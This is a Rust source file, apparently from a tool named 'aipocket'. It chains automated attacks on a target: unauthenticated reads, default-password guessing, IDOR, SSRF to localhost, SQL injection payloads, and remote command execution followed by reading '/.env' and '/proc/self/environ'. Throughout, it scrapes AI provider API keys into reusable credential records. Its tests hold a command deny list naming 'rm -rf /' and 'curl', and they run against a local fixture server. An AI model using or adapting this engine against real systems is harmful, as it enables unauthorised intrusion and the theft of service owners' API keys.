use crate::{NodeOutcome, NodeStatus, ProbeFinding, ProbeSpec, RiskPolicy, VulnClass};
use aipocket_core::Credential;
use anyhow::Result;
use serde_json::{Value, json};
use std::collections::{HashMap, HashSet};

#[derive(Clone, Debug, Default)]
pub struct EngineContext {
    pub target: String,
    pub product: String,
    pub auth_headers: HashMap<String, String>,
    pub object_ids: Vec<String>,
}

#[derive(Clone, Debug, Default)]
pub struct EngineResult {
    pub credentials: Vec<Credential>,
    pub findings: Vec<ProbeFinding>,
    pub outcomes: Vec<NodeOutcome>,
}

pub async fn execute_plan(
    http: &reqwest::Client,
    mut context: EngineContext,
    specs: &[ProbeSpec],
    policy: &RiskPolicy,
    request_budget: usize,
) -> EngineResult {
    let planned = crate::plan_specs(&context.product, specs, &context.target, policy, &[]);
    let planned_ids: HashSet<_> = planned.iter().map(|spec| spec.id.clone()).collect();
    let mut result = EngineResult::default();
    for spec in specs.iter().filter(|spec| !planned_ids.contains(&spec.id)) {
        result.outcomes.push(outcome(
            spec,
            if policy.enabled_classes.contains(&spec.vuln_class) {
                NodeStatus::SkippedGate
            } else {
                NodeStatus::SkippedClass
            },
            "risk gate or class disabled",
            0,
            0,
        ));
    }
    let mut completed = HashSet::new();
    let mut failed = HashSet::new();
    let mut remaining = request_budget;
    let mut pending = planned;
    while !pending.is_empty() {
        let mut progressed = false;
        let mut deferred = Vec::new();
        for spec in pending {
            if spec
                .depends_on
                .iter()
                .any(|dependency| failed.contains(dependency))
            {
                result.outcomes.push(outcome(
                    &spec,
                    NodeStatus::SkippedDependency,
                    "dependency failed or skipped",
                    0,
                    0,
                ));
                failed.insert(spec.id.clone());
                progressed = true;
                continue;
            }
            if spec
                .depends_on
                .iter()
                .any(|dependency| !completed.contains(dependency))
            {
                deferred.push(spec);
                continue;
            }
            if spec.requires_auth && context.auth_headers.is_empty() {
                result.outcomes.push(outcome(
                    &spec,
                    NodeStatus::SkippedNoAuth,
                    "no authenticated session",
                    0,
                    0,
                ));
                failed.insert(spec.id.clone());
                progressed = true;
                continue;
            }
            if remaining == 0 {
                result.outcomes.push(outcome(
                    &spec,
                    NodeStatus::SkippedBudget,
                    "budget exhausted",
                    0,
                    0,
                ));
                failed.insert(spec.id.clone());
                progressed = true;
                continue;
            }
            let allowance = remaining.min(spec.max_requests);
            match run_engine(http, &mut context, &spec, allowance).await {
                Ok(engine) => {
                    remaining = remaining.saturating_sub(engine.requests_used);
                    let found = engine.credentials.len();
                    result.credentials.extend(engine.credentials);
                    result.findings.extend(engine.findings);
                    result.outcomes.push(outcome(
                        &spec,
                        NodeStatus::Executed,
                        &engine.reason,
                        engine.requests_used,
                        found,
                    ));
                    completed.insert(spec.id.clone());
                }
                Err(error) => {
                    result.outcomes.push(outcome(
                        &spec,
                        NodeStatus::Failed,
                        &error.to_string(),
                        0,
                        0,
                    ));
                    failed.insert(spec.id.clone());
                }
            }
            progressed = true;
        }
        if !progressed {
            for spec in deferred {
                result.outcomes.push(outcome(
                    &spec,
                    NodeStatus::SkippedDependency,
                    "unresolved dependency",
                    0,
                    0,
                ));
            }
            break;
        }
        pending = deferred;
    }
    result
}

#[derive(Default)]
struct NodeResult {
    credentials: Vec<Credential>,
    findings: Vec<ProbeFinding>,
    requests_used: usize,
    reason: String,
}

async fn run_engine(
    http: &reqwest::Client,
    context: &mut EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    match spec.vuln_class {
        VulnClass::UnauthRead => run_unauth(http, context, spec, budget).await,
        VulnClass::WeakPassword => run_weak_password(http, context, spec, budget).await,
        VulnClass::Idor => run_idor(http, context, spec, budget).await,
        VulnClass::Ssrf => run_ssrf(http, context, spec, budget).await,
        VulnClass::Sqli => run_sqli(http, context, spec, budget).await,
        VulnClass::Rce => run_rce(http, context, spec, budget).await,
    }
}

async fn run_unauth(
    http: &reqwest::Client,
    context: &EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    let mut result = NodeResult::default();
    let paths = strings(&spec.entry, "paths");
    for path in paths.into_iter().take(budget.min(spec.max_requests)) {
        let response = http.get(url(&context.target, &path)).send().await?;
        result.requests_used += 1;
        if response.status().is_success() {
            let text = response.text().await.unwrap_or_default();
            let credentials = extract_credentials(&text, &context.target, &context.product);
            result.credentials.extend(credentials);
        }
    }
    if !result.credentials.is_empty() {
        result.findings.push(finding(
            spec,
            context,
            "Unauthenticated read returned credentials",
            json!({"credential_count":result.credentials.len()}),
        ));
    }
    Ok(result)
}

async fn run_weak_password(
    http: &reqwest::Client,
    context: &mut EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    let login = string(&spec.entry, "login")
        .or_else(|| string(&spec.entry, "login_path"))
        .unwrap_or_default();
    if login.is_empty() {
        return Ok(NodeResult {
            reason: "no login path".into(),
            ..Default::default()
        });
    }
    let mut result = NodeResult::default();
    let body = spec
        .entry
        .get("body")
        .and_then(Value::as_object)
        .cloned()
        .unwrap_or_else(|| {
            serde_json::Map::from_iter([
                ("username".into(), Value::String("{user}".into())),
                ("password".into(), Value::String("{pass}".into())),
            ])
        });
    let post_reserve = strings(&spec.entry, "post_auth_paths").len().clamp(1, 5);
    let attempt_limit = budget.min(spec.max_requests.saturating_sub(post_reserve).max(1));
    for (user, password) in weak_credentials().into_iter().take(attempt_limit) {
        let payload = Value::Object(
            body.iter()
                .map(|(key, value)| {
                    (
                        key.clone(),
                        value
                            .as_str()
                            .map(|text| {
                                Value::String(
                                    text.replace("{user}", &user).replace("{pass}", &password),
                                )
                            })
                            .unwrap_or_else(|| value.clone()),
                    )
                })
                .collect(),
        );
        let response = http
            .post(url(&context.target, &login))
            .json(&payload)
            .send()
            .await?;
        result.requests_used += 1;
        if !response.status().is_success() {
            continue;
        }
        let data: Value = response.json().await.unwrap_or(Value::Null);
        let success_field = string(&spec.entry, "success_field");
        if success_field
            .as_ref()
            .is_some_and(|field| data.get(field).and_then(Value::as_bool) != Some(true))
        {
            continue;
        }
        let token = if success_field.is_some() {
            data.get("data").and_then(Value::as_str)
        } else {
            ["token", "access_token", "key", "api_key", "JWT", "jwt"]
                .into_iter()
                .find_map(|field| {
                    data.get(field)
                        .or_else(|| data.get("data").and_then(|nested| nested.get(field)))
                        .and_then(Value::as_str)
                })
        };
        if let Some(token) = token {
            context
                .auth_headers
                .insert("authorization".into(), format!("Bearer {token}"));
            result.findings.push(finding(
                spec,
                context,
                "Weak/default credentials accepted",
                json!({"username":user}),
            ));
            for path in strings(&spec.entry, "post_auth_paths") {
                if result.requests_used >= budget.min(spec.max_requests) {
                    break;
                }
                let mut request = http.get(url(&context.target, &path));
                for (key, value) in &context.auth_headers {
                    request = request.header(key, value);
                }
                if let Ok(response) = request.send().await {
                    result.requests_used += 1;
                    if response.status().is_success() {
                        let text = response.text().await.unwrap_or_default();
                        result.credentials.extend(extract_credentials(
                            &text,
                            &context.target,
                            &context.product,
                        ));
                    }
                }
            }
            break;
        }
    }
    if context.auth_headers.is_empty() {
        result.reason = "no weak credential accepted".into();
    }
    Ok(result)
}

async fn run_idor(
    http: &reqwest::Client,
    context: &mut EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    let template = string(&spec.entry, "object")
        .or_else(|| string(&spec.entry, "object_path"))
        .unwrap_or_default();
    if template.is_empty() {
        return Ok(NodeResult {
            reason: "no object path".into(),
            ..Default::default()
        });
    }
    let mut result = NodeResult::default();
    let mut ids = strings(&spec.entry, "predictable_ids");
    if ids.is_empty() {
        ids = (1..=5).map(|value| value.to_string()).collect();
    }
    for id in ids.into_iter().take(budget / 2) {
        let path = template.replace("{id}", &id);
        let mut request = http.get(url(&context.target, &path));
        for (key, value) in &context.auth_headers {
            request = request.header(key, value);
        }
        let authed = request.send().await?;
        result.requests_used += 1;
        if !authed.status().is_success() || result.requests_used >= budget {
            continue;
        }
        let authed_text = authed.text().await.unwrap_or_default();
        result.credentials.extend(extract_credentials(
            &authed_text,
            &context.target,
            &context.product,
        ));
        let unauth = http.get(url(&context.target, &path)).send().await?;
        result.requests_used += 1;
        if unauth.status().is_success() {
            let text = unauth.text().await.unwrap_or_default();
            let found = extract_credentials(&text, &context.target, &context.product);
            result.credentials.extend(found);
            result.findings.push(finding(
                spec,
                context,
                "Object readable across authorization boundary",
                json!({"object_id":id}),
            ));
            break;
        }
    }
    if result.findings.is_empty() {
        result.reason = "no unauthorized cross-boundary access proven".into();
    }
    Ok(result)
}

async fn run_ssrf(
    http: &reqwest::Client,
    context: &EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    let path = string(&spec.entry, "path")
        .or_else(|| string(&spec.entry, "trigger_path"))
        .unwrap_or_default();
    if path.is_empty() {
        return Ok(NodeResult {
            reason: "no SSRF trigger path".into(),
            ..Default::default()
        });
    }
    let parameter = string(&spec.entry, "url_param").unwrap_or_else(|| "url".into());
    let mut result = NodeResult::default();
    let targets = strings(&spec.entry, "target_urls");
    let targets = if targets.is_empty() {
        vec![
            "http://127.0.0.1/".into(),
            "http://127.0.0.1:80/".into(),
            "http://localhost/".into(),
        ]
    } else {
        targets
    };
    let marker_keys = strings(&spec.entry, "success_markers");
    let marker_keys = if marker_keys.is_empty() {
        vec![
            "127.0.0.1".into(),
            "localhost".into(),
            "OPENAI".into(),
            "api_key".into(),
            "sk-".into(),
        ]
    } else {
        marker_keys
    };
    for target in targets
        .into_iter()
        .take(budget.min(spec.max_requests).min(3))
    {
        let response = http
            .post(url(&context.target, &path))
            .json(&json!({parameter.clone():target}))
            .send()
            .await?;
        result.requests_used += 1;
        let status = response.status();
        let text = response.text().await.unwrap_or_default();
        let found = extract_credentials(&text, &context.target, &context.product);
        result.credentials.extend(found);
        if status.is_success()
            && text.len() > 20
            && marker_keys.iter().any(|marker| {
                text.to_ascii_lowercase()
                    .contains(&marker.to_ascii_lowercase())
            })
        {
            result.findings.push(finding(
                spec,
                context,
                "SSRF read proof confirmed",
                json!({"path":path,"target":target}),
            ));
            break;
        }
    }
    if result.findings.is_empty() {
        result.reason = "ssrf not confirmed".into();
    }
    Ok(result)
}

async fn run_sqli(
    http: &reqwest::Client,
    context: &EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    let path = string(&spec.entry, "path").unwrap_or_default();
    let parameter = string(&spec.entry, "param").unwrap_or_else(|| "id".into());
    if path.is_empty() {
        return Ok(NodeResult {
            reason: "no sqli path".into(),
            ..Default::default()
        });
    }
    let payloads = strings(&spec.entry, "payloads");
    let payloads = if payloads.is_empty() {
        vec!["' OR '1'='1".into(), "'".into()]
    } else {
        payloads
    };
    let banned = [
        "drop ",
        "delete ",
        "truncate ",
        "update ",
        "insert ",
        "alter ",
    ];
    let mut result = NodeResult::default();
    let baseline = string(&spec.entry, "baseline").unwrap_or_else(|| "1".into());
    let baseline_response = http
        .get(url(&context.target, &path))
        .query(&[(parameter.as_str(), baseline.as_str())])
        .send()
        .await?;
    result.requests_used += 1;
    let baseline_status = baseline_response.status();
    let baseline_len = baseline_response.text().await.unwrap_or_default().len();
    let mut confirmed = false;
    for payload in payloads
        .into_iter()
        .filter(|payload| {
            !banned
                .iter()
                .any(|word| payload.to_ascii_lowercase().contains(word))
        })
        .take(
            budget
                .saturating_sub(1)
                .min(spec.max_requests.saturating_sub(1)),
        )
    {
        let response = http
            .get(url(&context.target, &path))
            .query(&[(parameter.as_str(), payload.as_str())])
            .send()
            .await?;
        result.requests_used += 1;
        let status = response.status();
        let text = response.text().await.unwrap_or_default();
        let lowered = text.to_ascii_lowercase();
        let found = extract_credentials(&text, &context.target, &context.product);
        result.credentials.extend(found);
        if [
            "sql syntax",
            "sqlite",
            "postgresql",
            "mysql",
            "odbc",
            "syntax error",
        ]
        .iter()
        .any(|marker| lowered.contains(marker))
            || status != baseline_status
            || text.len().abs_diff(baseline_len) > 50
            || !result.credentials.is_empty()
        {
            confirmed = true;
            break;
        }
    }
    if confirmed {
        result.findings.push(finding(
            spec,
            context,
            "SQL injection read proof confirmed",
            json!({"path":path,"param":parameter}),
        ));
    }
    if result.findings.is_empty() {
        result.reason = "sqli not confirmed".into();
    }
    Ok(result)
}

async fn run_rce(
    http: &reqwest::Client,
    context: &EngineContext,
    spec: &ProbeSpec,
    budget: usize,
) -> Result<NodeResult> {
    let path = string(&spec.entry, "path").unwrap_or_default();
    let parameter = string(&spec.entry, "param").unwrap_or_else(|| "command".into());
    if path.is_empty() || budget == 0 {
        return Ok(NodeResult {
            reason: "no rce path or budget".into(),
            ..Default::default()
        });
    }
    let marker = format!("aipocket-rce-{}", uuid::Uuid::new_v4().simple());
    let command = format!("echo {marker}");
    let response = http
        .post(url(&context.target, &path))
        .json(&json!({parameter.clone():command}))
        .send()
        .await?;
    let status = response.status();
    let text = response.text().await.unwrap_or_default();
    let mut result = NodeResult {
        requests_used: 1,
        ..Default::default()
    };
    if status.is_success() && text.contains(&marker) {
        for secret_command in strings(&spec.entry, "secret_commands") {
            if result.requests_used >= budget.min(spec.max_requests)
                || !command_allowed(&secret_command)
            {
                break;
            }
            let response = http
                .post(url(&context.target, &path))
                .json(&json!({parameter.clone():secret_command}))
                .send()
                .await?;
            result.requests_used += 1;
            let text = response.text().await.unwrap_or_default();
            result.credentials.extend(extract_credentials(
                &text,
                &context.target,
                &context.product,
            ));
        }
        result.findings.push(finding(
            spec,
            context,
            "RCE minimal proof confirmed by nonce echo",
            json!({"path":path,"proof_marker_prefix":"aipocket-rce"}),
        ));
    } else {
        result.reason = "rce not confirmed (marker not echoed)".into();
    }
    Ok(result)
}

fn command_allowed(command: &str) -> bool {
    let parts: Vec<_> = command.split_whitespace().collect();
    match parts.as_slice() {
        ["printenv"] | ["env"] | ["id"] | ["uname"] => true,
        ["cat", path] => matches!(
            *path,
            "/.env" | "/app/.env" | "/proc/self/environ" | "/etc/hostname"
        ),
        ["echo", ..] => true,
        _ => false,
    }
}

fn finding(
    spec: &ProbeSpec,
    context: &EngineContext,
    summary: &str,
    evidence: Value,
) -> ProbeFinding {
    ProbeFinding {
        product: context.product.clone(),
        vuln_class: spec.vuln_class.as_str().into(),
        risk: spec.risk_level as u8,
        evidence: json!({"spec_id":spec.id,"cve_ids":spec.cve_ids,"confirmed":true,"summary":summary,"detail":evidence}),
        credentials: vec![],
    }
}
fn outcome(
    spec: &ProbeSpec,
    status: NodeStatus,
    reason: &str,
    requests_used: usize,
    credentials_found: usize,
) -> NodeOutcome {
    NodeOutcome {
        spec_id: spec.id.clone(),
        vuln_class: spec.vuln_class,
        risk_level: spec.risk_level,
        status,
        requests_used,
        reason: reason.into(),
        credentials_found,
    }
}
fn url(target: &str, path: &str) -> String {
    format!(
        "{}{}",
        target.trim_end_matches('/'),
        if path.starts_with('/') {
            path.to_owned()
        } else {
            format!("/{path}")
        }
    )
}
fn string(value: &Value, key: &str) -> Option<String> {
    value.get(key).and_then(Value::as_str).map(str::to_owned)
}
fn strings(value: &Value, key: &str) -> Vec<String> {
    value
        .get(key)
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .map(str::to_owned)
        .collect()
}
fn weak_credentials() -> Vec<(String, String)> {
    let passwords = include_str!("../data/weak_passwords.txt")
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'));
    ["admin", "root"]
        .into_iter()
        .flat_map(|user| {
            passwords
                .clone()
                .map(move |password| (user.into(), password.into()))
        })
        .collect()
}
fn extract_credentials(text: &str, target: &str, product: &str) -> Vec<Credential> {
    let pattern = regex::Regex::new(r"(?:sk-[A-Za-z0-9_-]{16,}|AIza[A-Za-z0-9_-]{20,}|gsk_[A-Za-z0-9_-]{16,}|nvapi-[A-Za-z0-9_-]{16,})").expect("credential regex");
    pattern
        .find_iter(text)
        .map(|item| Credential {
            apikey: item.as_str().into(),
            apiurl: target.into(),
            host: target.into(),
            backend: "prober".into(),
            product: product.into(),
            ..Default::default()
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::RiskLevel;
    use axum::{
        Json, Router,
        extract::Path,
        http::{HeaderMap, StatusCode},
        response::IntoResponse,
        routing::{get, post},
    };

    fn spec(
        id: &str,
        class: VulnClass,
        risk_level: RiskLevel,
        requires_auth: bool,
        depends_on: &[&str],
        entry: Value,
        max_requests: usize,
    ) -> ProbeSpec {
        ProbeSpec {
            id: id.into(),
            product: "fixture".into(),
            vuln_class: class,
            risk_level,
            cve_ids: vec![],
            requires_auth,
            depends_on: depends_on.iter().map(|value| (*value).into()).collect(),
            entry,
            max_requests,
        }
    }

    fn policy() -> RiskPolicy {
        RiskPolicy {
            enabled_classes: [
                VulnClass::UnauthRead,
                VulnClass::WeakPassword,
                VulnClass::Idor,
                VulnClass::Ssrf,
                VulnClass::Sqli,
                VulnClass::Rce,
            ]
            .into_iter()
            .collect(),
            max_risk: RiskLevel::L3,
            intrusive_checks: true,
            authorized_scope: vec![],
            ssrf_enabled: true,
            sqli_enabled: true,
            rce_enabled: true,
        }
    }

    async fn fixture_server() -> (String, tokio::task::JoinHandle<()>) {
        let app = Router::new()
            .route(
                "/secrets",
                get(|| async { "OPENAI_API_KEY=sk-fixture-abcdefghijkl" }),
            )
            .route(
                "/login",
                post(|Json(body): Json<Value>| async move {
                    if body["username"] == "admin" && body["password"] == "123456789" {
                        Json(json!({"token":"fixture-token"})).into_response()
                    } else {
                        (StatusCode::UNAUTHORIZED, Json(json!({"error":"invalid"}))).into_response()
                    }
                }),
            )
            .route(
                "/objects/{id}",
                get(|Path(id): Path<String>, headers: HeaderMap| async move {
                    if id == "1" || headers.get("authorization").is_some() {
                        (StatusCode::OK, "sk-object-abcdefghijkl").into_response()
                    } else {
                        StatusCode::FORBIDDEN.into_response()
                    }
                }),
            )
            .route(
                "/ssrf",
                post(|| async { "localhost OPENAI_API_KEY=sk-ssrf-abcdefghijkl" }),
            )
            .route(
                "/search",
                get(|query: axum::extract::RawQuery| async move {
                    if query.0.as_deref().is_some_and(|value| value.contains("OR")) {
                        "postgresql syntax error: sk-sqli-abcdefghijkl"
                    } else {
                        "baseline"
                    }
                }),
            )
            .route(
                "/exec",
                post(|Json(body): Json<Value>| async move {
                    body["command"]
                        .as_str()
                        .unwrap_or_default()
                        .replace("echo ", "")
                }),
            );
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let address = listener.local_addr().unwrap();
        let task = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        (format!("http://{address}"), task)
    }

    #[test]
    fn helper_contracts_filter_commands_and_extract_credentials() {
        assert!(weak_credentials().len() > 10);
        for word in [
            "drop ",
            "delete ",
            "truncate ",
            "update ",
            "insert ",
            "alter ",
        ] {
            assert!(!"' OR '1'='1".contains(word));
        }
        for allowed in [
            "printenv",
            "env",
            "id",
            "uname",
            "cat /.env",
            "cat /app/.env",
            "cat /proc/self/environ",
            "cat /etc/hostname",
            "echo fixture",
        ] {
            assert!(command_allowed(allowed), "{allowed}");
        }
        for denied in ["cat /etc/passwd", "rm -rf /", "curl example.com"] {
            assert!(!command_allowed(denied), "{denied}");
        }
        assert_eq!(url("https://host/", "path"), "https://host/path");
        assert_eq!(url("https://host", "/path"), "https://host/path");
        let credentials = extract_credentials(
            "sk-one-abcdefghijkl AIzaSyDaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "https://fixture",
            "fixture",
        );
        assert_eq!(credentials.len(), 2);
        assert!(credentials.iter().all(|item| item.backend == "prober"));
    }

    #[tokio::test]
    async fn plan_executes_all_engines_and_records_gate_states() {
        let (target, server) = fixture_server().await;
        let specs = vec![
            spec(
                "unauth",
                VulnClass::UnauthRead,
                RiskLevel::L0,
                false,
                &[],
                json!({"paths":["/secrets"]}),
                1,
            ),
            spec(
                "weak",
                VulnClass::WeakPassword,
                RiskLevel::L1,
                false,
                &[],
                json!({"login":"/login","post_auth_paths":["/secrets"]}),
                3,
            ),
            spec(
                "idor",
                VulnClass::Idor,
                RiskLevel::L1,
                true,
                &["weak"],
                json!({"object":"/objects/{id}","predictable_ids":["1"]}),
                2,
            ),
            spec(
                "ssrf",
                VulnClass::Ssrf,
                RiskLevel::L2,
                false,
                &[],
                json!({"path":"/ssrf"}),
                1,
            ),
            spec(
                "sqli",
                VulnClass::Sqli,
                RiskLevel::L2,
                false,
                &[],
                json!({"path":"/search","payloads":["' OR '1'='1"]}),
                2,
            ),
            spec(
                "rce",
                VulnClass::Rce,
                RiskLevel::L3,
                false,
                &[],
                json!({"path":"/exec","secret_commands":["cat /.env","rm -rf /"]}),
                2,
            ),
        ];
        let result = execute_plan(
            &reqwest::Client::new(),
            EngineContext {
                target,
                product: "fixture".into(),
                ..Default::default()
            },
            &specs,
            &policy(),
            20,
        )
        .await;
        assert_eq!(result.outcomes.len(), specs.len());
        assert!(
            result
                .outcomes
                .iter()
                .all(|outcome| outcome.status == NodeStatus::Executed),
            "{:?}",
            result.outcomes
        );
        assert_eq!(result.findings.len(), specs.len());
        assert!(result.credentials.len() >= 4);

        let gated = execute_plan(
            &reqwest::Client::new(),
            EngineContext {
                target: "http://127.0.0.1:1".into(),
                product: "fixture".into(),
                ..Default::default()
            },
            &[
                spec(
                    "class-off",
                    VulnClass::Rce,
                    RiskLevel::L3,
                    false,
                    &[],
                    Value::Null,
                    1,
                ),
                spec(
                    "needs-auth",
                    VulnClass::UnauthRead,
                    RiskLevel::L0,
                    true,
                    &[],
                    json!({"paths":[]}),
                    1,
                ),
                spec(
                    "budget",
                    VulnClass::UnauthRead,
                    RiskLevel::L0,
                    false,
                    &[],
                    json!({"paths":[]}),
                    1,
                ),
            ],
            &RiskPolicy {
                enabled_classes: [VulnClass::UnauthRead].into_iter().collect(),
                ..policy()
            },
            0,
        )
        .await;
        assert!(gated.outcomes.iter().any(|item| {
            item.spec_id == "class-off" && item.status == NodeStatus::SkippedClass
        }));
        assert!(gated.outcomes.iter().any(|item| {
            item.spec_id == "needs-auth" && item.status == NodeStatus::SkippedNoAuth
        }));
        assert!(
            gated.outcomes.iter().any(|item| {
                item.spec_id == "budget" && item.status == NodeStatus::SkippedBudget
            })
        );
        server.abort();
    }

    #[tokio::test]
    async fn dependency_and_transport_failures_are_isolated() {
        let failed = spec(
            "failed",
            VulnClass::UnauthRead,
            RiskLevel::L0,
            false,
            &[],
            json!({"paths":["/unreachable"]}),
            1,
        );
        let dependent = spec(
            "dependent",
            VulnClass::UnauthRead,
            RiskLevel::L0,
            false,
            &["failed"],
            json!({"paths":[]}),
            1,
        );
        let unresolved = spec(
            "unresolved",
            VulnClass::UnauthRead,
            RiskLevel::L0,
            false,
            &["missing"],
            json!({"paths":[]}),
            1,
        );
        let result = execute_plan(
            &reqwest::Client::new(),
            EngineContext {
                target: "http://127.0.0.1:1".into(),
                product: "fixture".into(),
                ..Default::default()
            },
            &[failed, dependent, unresolved],
            &policy(),
            3,
        )
        .await;
        assert!(
            result
                .outcomes
                .iter()
                .any(|item| item.spec_id == "failed" && item.status == NodeStatus::Failed)
        );
        assert!(result.outcomes.iter().any(|item| {
            item.spec_id == "dependent" && item.status == NodeStatus::SkippedDependency
        }));
        assert!(result.outcomes.iter().any(|item| {
            item.spec_id == "unresolved" && item.status == NodeStatus::SkippedDependency
        }));
    }
}
